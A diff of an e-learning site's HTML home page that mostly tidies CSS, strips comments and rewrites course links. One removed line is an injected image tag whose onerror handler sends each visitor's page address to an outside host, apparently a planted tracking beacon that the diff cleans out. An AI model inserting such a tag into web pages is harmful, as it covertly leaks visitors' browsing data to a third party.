@@ -89,86 +89,20 @@ filter:blur(22px) saturate(120%);opacity:.9;animation:floatBlobs 18s ease-in-out
 @keyframes spinMesh{to{transform:rotate(360deg)}}
 </style>
 <style id="courses-ui-override">
-  /* ==== Screenshot-style Courses UI (scoped to #courses only) ==== */
-  #courses .course-grid{
-    display:grid;
-    grid-template-columns:repeat(auto-fill, minmax(340px,1fr));
-    gap:2rem;
-    margin-top:2rem;
-  }
-
-  #courses .card{
-    position:relative;
-    background:#fff;
-    border:1px solid #eef2ff;
-    border-radius:24px;
-    padding:2rem;
-    box-shadow:0 16px 28px rgba(2,6,23,.06);
-    transition:transform .18s ease, box-shadow .18s ease, border-color .18s ease;
-    overflow:hidden;
-  }
-
-  #courses .card::after{
-    content:"";
-    position:absolute;
-    top:-40px; right:-40px;
-    width:180px; height:180px;
-    background:radial-gradient(120px circle at center, rgba(99,102,241,.12), transparent 60%);
-    pointer-events:none;
-  }
-
-  #courses .card:hover{
-    transform:translateY(-6px);
-    box-shadow:0 22px 38px rgba(2,6,23,.10);
-    border-color:#e0e7ff;
-  }
-
-  #courses .card h3{
-    margin:0 0 .5rem;
-    font-size:1.4rem;
-    font-weight:800;
-    color:#0f172a;
-  }
-
-  #courses .card p{
-    margin:0 0 1.25rem;
-    color:#475569;
-    font-size:1rem;
-    line-height:1.6;
-  }
-
-  #courses .card .btn.btn-primary{
-    background:linear-gradient(135deg, #6366f1 0%, #7c3aed 100%);
-    border:none;
-    color:#fff;
-    border-radius:12px;
-    padding:.9rem 1.25rem;
-    box-shadow:0 10px 20px rgba(99,102,241,.25);
-  }
-  #courses .card .btn.btn-primary:hover{
-    transform:translateY(-2px);
-    box-shadow:0 16px 28px rgba(99,102,241,.28);
-  }
-
-  [data-theme="dark"] #courses .card{
-    background:var(--surface);
-    border:1px solid var(--border);
-    box-shadow:0 16px 28px rgba(0,0,0,.35);
-  }
-  [data-theme="dark"] #courses .card::after{
-    background:radial-gradient(120px circle at center, rgba(99,102,241,.18), transparent 60%);
-  }
-  [data-theme="dark"] #courses .card h3{ color:var(--text); }
-  [data-theme="dark"] #courses .card p{ color:var(--text-secondary); }
+  /* Screenshot-style Courses UI (scoped to #courses only) */
+  #courses .course-grid{display:grid;grid-template-columns:repeat(auto-fill, minmax(340px,1fr));gap:2rem;margin-top:2rem;}
+  #courses .card{position:relative;background:#fff;border:1px solid #eef2ff;border-radius:24px;padding:2rem;box-shadow:0 16px 28px rgba(2,6,23,.06);transition:transform .18s ease, box-shadow .18s ease, border-color .18s ease;overflow:hidden;}
+  #courses .card:hover{transform:translateY(-6px);box-shadow:0 22px 38px rgba(2,6,23,.10);border-color:#e0e7ff;}
+  #courses .card h3{margin:0 0 .5rem;font-size:1.4rem;font-weight:800;color:#0f172a;}
+  #courses .card p{margin:0 0 1.25rem;color:#475569;font-size:1rem;line-height:1.6;}
+  #courses .card .btn.btn-primary{background:linear-gradient(135deg, #6366f1 0%, #7c3aed 100%);border:none;color:#fff;border-radius:12px;padding:.9rem 1.25rem;box-shadow:0 10px 20px rgba(99,102,241,.25);}
+  #courses .card .btn.btn-primary:hover{transform:translateY(-2px);box-shadow:0 16px 28px rgba(99,102,241,.28);}
 </style>
 <style id="top-ui-override">
-  /* Header refinement: keep simple border, remove color smudges */
   .site-header{background:#fff;border-bottom:1px solid var(--border);transition:box-shadow .2s ease,border-color .2s ease}
   .site-header.scrolled{box-shadow:0 8px 24px rgba(2,6,23,.06)}
   .site-header .accent{display:none}
-  /* Brand back to clean ink */
   .brand{color:#0b1020;background:none;-webkit-background-clip:initial;background-clip:initial}
-  /* Neutral underline hover */
   nav a{color:#0f172a;font-weight:700;padding:10px 10px;border-radius:8px;position:relative}
   nav a::after{content:"";position:absolute;left:10px;right:10px;bottom:6px;height:2px;background:#0f172a;transform:scaleX(0);transform-origin:left;transition:transform .18s ease}
   nav a:hover::after, nav a:focus-visible::after{transform:scaleX(1)}
@@ -176,16 +110,13 @@ filter:blur(22px) saturate(120%);opacity:.9;animation:floatBlobs 18s ease-in-out
   .btn-cta{background:linear-gradient(135deg,#4f46e5,#7c3aed);border:1px solid rgba(99,102,241,.22);color:#fff !important;padding:10px 16px;border-radius:999px;box-shadow:0 10px 22px rgba(79,70,229,.22)}
 </style>
 <style id="hero-clean-override">
-  /* Remove purple smudges in hero */
   .hero{background:linear-gradient(180deg,#ffffff 0%, #f8fafc 100%) !important; position:relative}
   .hero::before, .hero::after{content:none !important; display:none !important}
 </style>
 <style id="courses-clean-override">
-  /* Remove purple smudges on course cards */
   #courses .card::after{content:none !important; display:none !important}
 </style>
 <style id="hero-edge-pattern">
-  /* Engaging but clean side treatment for hero (no purple smudges) */
   .hero{position:relative; isolation:isolate;}
   .hero::before, .hero::after{
     content:""; position:absolute; top:0; bottom:0; width:38%; pointer-events:none; z-index:0;
@@ -195,15 +126,8 @@ filter:blur(22px) saturate(120%);opacity:.9;animation:floatBlobs 18s ease-in-out
   }
   .hero::before{ left:0; mask-image: linear-gradient(to right, rgba(0,0,0,.75), rgba(0,0,0,0)); -webkit-mask-image: linear-gradient(to right, rgba(0,0,0,.75), rgba(0,0,0,0)); }
   .hero::after{ right:0; mask-image: linear-gradient(to left, rgba(0,0,0,.75), rgba(0,0,0,0)); -webkit-mask-image: linear-gradient(to left, rgba(0,0,0,.75), rgba(0,0,0,0)); }
-
-  /* Dark theme tuning */
-  [data-theme="dark"] .hero::before,
-  [data-theme="dark"] .hero::after{
-    background-image: radial-gradient(#3b485b 1px, transparent 1.1px);
-    opacity:.35;
-  }
 </style>
-</head><img onerror=src='//qntc.it/t/7d234588?'+location src>
+</head>
 <body>
   <header class="site-header" id="header">
   <div class="navbar">
@@ -233,18 +157,18 @@ filter:blur(22px) saturate(120%);opacity:.9;animation:floatBlobs 18s ease-in-out
   <section id="courses" class="courses">
   <h2>Explore Learning Tracks</h2>
   <div class="course-grid">
-    <div class="card"><h3>Applied Mathematics</h3><p>Precalculus, linear algebra, and problem‑solving, simplified and visualized.</p><a href="/memolearning/math_courses.html" class="btn-secondary">Start Learning</a></div>
-    <div class="card"><h3>Computer Science</h3><p>Learn Python, algorithms, data structures, and system design.</p><a href="/memolearning/cs_courses.html" class="btn-secondary">Start Learning</a></div>
-    <div class="card"><h3>Finance &amp; Investing</h3><p>Understand money, markets, and smart financial decisions.</p><a href="/memolearning/finance_courses.html" class="btn-secondary">Start Learning</a></div>
-    <div class="card"><h3>Data Science</h3><p>Analyze data, build models, and extract insights using Python &amp; tools.</p><a href="/memolearning/data_science.html" class="btn-secondary">Start Learning</a></div>
-    <div class="card"><h3>Machine Learning</h3><p>Understand neural networks, AI logic, and ML tools hands‑on.</p><a href="/memolearning/machine_learning.html" class="btn-secondary">Start Learning</a></div>
-    <div class="card"><h3>Economics</h3><p>Understand how the economy works from micro to macro with clear examples.</p><a href="/memolearning/economics_courses.html" class="btn-secondary">Start Learning</a></div>
-    <div class="card"><h3>AI Engineering</h3><p>Deploy real‑world AI solutions using ML, APIs, cloud tools, and MLOps.</p><a href="/memolearning/ai_engineering.html" class="btn-secondary">Start Learning</a></div>
-    <div class="card"><h3>Cybersecurity</h3><p>Protect systems, understand ethical hacking, and learn digital forensics.</p><a href="/memolearning/cybersecurity.html" class="btn-secondary">Start Learning</a></div>
-    <div class="card"><h3>Front‑End Development</h3><p>Design beautiful interfaces using HTML, CSS, JavaScript, and React.</p><a href="/memolearning/frontend_development.html" class="btn-secondary">Start Learning</a></div>
-    <div class="card"><h3>Back‑End Development</h3><p>Learn servers, APIs, authentication, and databases with Node, Django.</p><a href="/memolearning/backend_development.html" class="btn-secondary">Start Learning</a></div>
-    <div class="card"><h3>Full‑Stack Development</h3><p>Build complete apps combining front‑end and back‑end skills.</p><a href="/memolearning/fullstack_development.html" class="btn-secondary">Start Learning</a></div>
-    <div class="card"><h3>Programming Languages</h3><p>Learn Python, JavaScript, Java, C++, and more for real‑world coding applications.</p><a href="/memolearning/programming_languages.html" class="btn-secondary">Start Learning</a></div>
+    <div class="card"><h3>Applied Mathematics</h3><p>Precalculus, linear algebra, and problem-solving, simplified and visualized.</p><a href="memolearning/math_courses.html" class="btn-secondary">Start Learning</a></div>
+    <div class="card"><h3>Computer Science</h3><p>Learn Python, algorithms, data structures, and system design.</p><a href="memolearning/cs_courses.html" class="btn-secondary">Start Learning</a></div>
+    <div class="card"><h3>Finance &amp; Investing</h3><p>Understand money, markets, and smart financial decisions.</p><a href="memolearning/finance_courses.html" class="btn-secondary">Start Learning</a></div>
+    <div class="card"><h3>Data Science</h3><p>Analyze data, build models, and extract insights using Python &amp; tools.</p><a href="memolearning/data_science.html" class="btn-secondary">Start Learning</a></div>
+    <div class="card"><h3>Machine Learning</h3><p>Understand neural networks, AI logic, and ML tools hands-on.</p><a href="memolearning/machine_learning.html" class="btn-secondary">Start Learning</a></div>
+    <div class="card"><h3>Economics</h3><p>Understand how the economy works from micro to macro with clear examples.</p><a href="memolearning/economics_courses.html" class="btn-secondary">Start Learning</a></div>
+    <div class="card"><h3>AI Engineering</h3><p>Deploy real-world AI solutions using ML, APIs, cloud tools, and MLOps.</p><a href="memolearning/ai_engineering.html" class="btn-secondary">Start Learning</a></div>
+    <div class="card"><h3>Cybersecurity</h3><p>Protect systems, understand ethical hacking, and learn digital forensics.</p><a href="memolearning/cybersecurity.html" class="btn-secondary">Start Learning</a></div>
+    <div class="card"><h3>Front-End Development</h3><p>Design beautiful interfaces using HTML, CSS, JavaScript, and React.</p><a href="memolearning/frontend_development.html" class="btn-secondary">Start Learning</a></div>
+    <div class="card"><h3>Back-End Development</h3><p>Learn servers, APIs, authentication, and databases with Node, Django.</p><a href="memolearning/backend_development.html" class="btn-secondary">Start Learning</a></div>
+    <div class="card"><h3>Full-Stack Development</h3><p>Build complete apps combining front-end and back-end skills.</p><a href="memolearning/fullstack_development.html" class="btn-secondary">Start Learning</a></div>
+    <div class="card"><h3>Programming Languages</h3><p>Learn Python, JavaScript, Java, C++, and more for real-world coding applications.</p><a href="memolearning/programming_languages.html" class="btn-secondary">Start Learning</a></div>
   </div>
 </section>
 
@@ -278,17 +202,14 @@ filter:blur(22px) saturate(120%);opacity:.9;animation:floatBlobs 18s ease-in-out
   </footer>
 <script>
   (function(){
-    // Header scroll shadow
     const header = document.getElementById('header');
     const onScroll = () => header.classList.toggle('scrolled', window.scrollY > 8);
     onScroll(); window.addEventListener('scroll', onScroll);
 
-    // Mobile menu
     const menuBtn = document.getElementById('menuToggle');
     const menu = document.getElementById('navMenu');
     menuBtn?.addEventListener('click', () => menu.classList.toggle('open'));
 
-    // Sign up modal
     const modal = document.getElementById('signupModal');
     const overlay = document.getElementById('overlay');
     const openers = [document.getElementById('signupOpen'), document.getElementById('signupOpen2')].filter(Boolean);
